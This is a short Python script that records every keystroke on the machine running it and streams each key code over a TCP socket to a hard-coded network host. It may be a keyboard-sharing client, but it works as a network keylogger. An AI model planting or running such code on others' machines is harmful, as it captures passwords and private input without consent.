#!/usr/bin/env python3

import socket
import json

from pynput.keyboard import Key, Listener, Controller, KeyCode

HOST = '192.168.100.9'
PORT = 1337

keyboard = Controller()

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((HOST, PORT))

def on_press(key):
    if hasattr(key, 'value'):
        key_code = key.value.vk
    else:
        key_code = key.vk

    d = {'type': 'press', 'key': key_code}
    socket.sendall(json.dumps(d).encode('utf-8'))


def on_release(key):
    if hasattr(key, 'value'):
        key_code = key.value.vk
    else:
        key_code = key.vk

    d = {'type': 'release', 'key': key_code}
    socket.sendall(json.dumps(d).encode('utf-8'))


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

